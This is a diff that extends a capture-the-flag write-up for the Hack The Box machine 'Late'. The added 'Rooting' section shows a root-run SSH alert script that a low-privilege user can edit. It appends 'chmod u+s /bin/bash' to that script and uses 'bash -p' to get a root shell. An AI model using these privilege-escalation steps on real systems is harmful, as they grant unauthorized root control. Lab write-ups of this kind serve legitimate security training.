@@ -280,6 +280,10 @@ And then in an image by capturing a "node screenshot" of:
 </h4>
 ```
 
+We get:
+
+![][image-payload]
+
 Feeding this image payload to the webservice gives:
 
 ```
@@ -337,10 +341,55 @@ chmod +x encode.sh
 ./encode.sh mkdir .ssh
 ```
 
-## Root
+## Rooting
+
+The user has Ssh credentials, which can be used to log as `svc_acc`.
+
+Running [LinPEAS][linpeas] returns:
+
+```
+You own the script: /usr/local/sbin/ssh-alert.sh
+```
+
+```shell
+#!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+```
+
+[Pspy][pspy] shows that the script is run by root and it is editable by `svc_acc`:
+
+```shell
+echo 'chmod u+s /bin/bash' >> /usr/local/sbin/ssh-alert.sh
+```
+
+It is launched on successful ssh logins, which is easy to trigger.
+
+```shell
+/bin/bash -p
+```
 
 [author-profile]: https://app.hackthebox.com/users/389926
 [hacktricks]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+[image-payload]: images/image-payload.png
+[linpeas]: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+[pspy]: https://github.com/DominicBreuker/pspy
 [screenshot-frontpage]: images/screenshot-frontpage.png
 [screenshot-webservice]: images/screenshot-webservice.png
 [ssti-vector]: images/ssti-test.png
